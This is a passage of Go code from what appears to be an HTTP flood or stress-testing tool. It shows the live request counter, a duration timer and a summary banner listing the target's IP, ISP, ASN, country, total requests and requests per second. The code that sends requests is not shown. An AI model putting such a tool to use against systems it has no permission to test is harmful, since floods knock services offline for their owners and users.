				RPS := float64(total) / elapsed.Seconds()
				
				fmt.Printf("\r%s%s%s REQ: %s%d%s | OK: %s%d%s | RPS: %s%.0f", 
						    Reset, time.Now().Format("04:05"), Reset,
 						   Yellow, total, Reset,
 						   Green, success, Reset,
						    Cyan, RPS)
			case <-stopChan:
				return
			}
		}
	}()

	go func() {
		time.Sleep(duration)
		close(stopChan)
	}()

	wg.Wait()

	elapsed := time.Since(startTime)
	TR := atomic.LoadInt64(&requests)
	SR := atomic.LoadInt64(&successCount)
	RPS := float64(TR) / elapsed.Seconds()

	L()
	fmt.Println(Yellow + "╔══════════════════════════════════════════════╗" + Reset)
	fmt.Printf("%s│%s Target     : %s%s\n", Yellow, Reset, Green, target) 
	fmt.Printf("%s│%s Host       : %s%s\n", Yellow, Reset, Green, host)
	fmt.Printf("%s│%s Host IP    : %s%s\n", Yellow, Reset, Green, HIP)
	fmt.Printf("%s│%s ISP        : %s%s\n", Yellow, Reset, Green, ISP)
	fmt.Printf("%s│%s ASN        : %s%s\n", Yellow, Reset, Green, ASN)
	fmt.Printf("%s│%s Country    : %s%s\n", Yellow, Reset, Green, CHS)
	fmt.Printf("%s│%s Duration   : %s\n", Yellow, Reset, elapsed.Round(time.Second))
	fmt.Printf("%s│%s Total Req  : %s%d\n", Yellow, Reset, Green, TR)
	fmt.Printf("%s│%s Success    : %s%d\n", Yellow, Reset, Green, SR)
	fmt.Printf("%s│%s RPS        : %s%.0f\n", Yellow, Reset, Green, RPS)
	fmt.Println(Yellow + "╚══════════════════════════════════════════════╝" + Reset)
}
